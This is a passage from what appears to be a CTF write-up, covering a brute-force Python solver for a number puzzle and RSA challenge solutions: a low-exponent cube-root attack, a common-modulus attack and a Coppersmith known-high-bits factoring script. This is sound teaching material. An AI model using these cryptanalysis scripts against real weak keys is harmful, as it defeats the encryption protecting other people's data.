class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3  <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i4 <span class="token operator">&lt;=</span> i5<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i1 <span class="token operator">>=</span> i2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">>=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">>=</span> i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num3<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i3 <span class="token operator">&lt;=</span> i4 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num5<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> num1<span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> num2<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">1</span>                                              <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> i3 <span class="token keyword">in</span> num3<span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">0</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">for</span> i4 <span class="token keyword">in</span> num4<span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">0</span>                            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    flag <span class="token operator">=</span> <span class="token number">1</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">for</span> i5 <span class="token keyword">in</span> num5<span class="token punctuation">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                        <span class="token keyword">continue</span>                                    <span class="token keyword">else</span><span class="token punctuation">:</span>                                        flag <span class="token operator">=</span> <span class="token number">0</span>                                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">if</span> <span class="token punctuation">(</span>i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                flag <span class="token operator">=</span> <span class="token number">1</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">continue</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span><span class="token comment">#################################</span></code></pre><p>[1, 4, 2, 5, 3]<br>[5, 3, 1, 4, 2]<br>[3, 5, 4, 2, 1]<br>[2, 1, 5, 3, 4]<br>[[4, 2, 3, 1, 5]</p><p>fill_number 会检查</p><pre class="language-none"><code class="language-none">map0000000000044000003000010</code></pre><p>最后 md5(1425353142350212150442315,32) = 8a04b4597ad08b83211d3adfa1f61431</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token punctuation">,</span> iroot<span class="token keyword">from</span> libnum <span class="token keyword">import</span> xgcd<span class="token punctuation">,</span> invmod<span class="token comment">#低解密指数攻击</span>n1<span class="token operator">=</span><span class="token number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span>e1<span class="token operator">=</span><span class="token number">3</span>c1<span class="token operator">=</span><span class="token number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment">#共模攻击</span><span class="token keyword">import</span> time<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><span class="token punctuation">,</span><span class="token number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><span class="token punctuation">]</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>c2 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>e1 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>e2 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token operator">-</span>s1    c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s2 <span class="token operator">=</span> <span class="token operator">-</span>s2    c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span> <span class="token string">' [-]m is:'</span> <span class="token operator">+</span> <span class="token string">'&#123;:x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'\n[!]Timer:'</span><span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token keyword">print</span> <span class="token string">'[!]All Done!'</span><span class="token comment">#已知高位p攻击</span><span class="token triple-quoted-string string">"""已知高位p，利用网上的sage脚本，获取pn=113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147p=7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902pbits = 512kbits = pbits-p.nbits()p=p&lt;&lt;kbitsprint("upper %d bits (of %d bits) is given" % (pbits-kbits, pbits))PR.&lt;x> = PolynomialRing(Zmod(n))f = x + px0 = f.small_roots(X=2^kbits, beta=0.4)[0]print(p+x0)out:upper 312 bits (of 512 bits) is given11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423"""</span>c4 <span class="token operator">=</span> <span class="token number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span>e4 <span class="token operator">=</span> <span class="token number">65537</span>N4 <span class="token operator">=</span> <span class="token number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span>p <span class="token operator">=</span> <span class="token number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span>q <span class="token operator">=</span> N4 <span class="token operator">//</span> pn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token 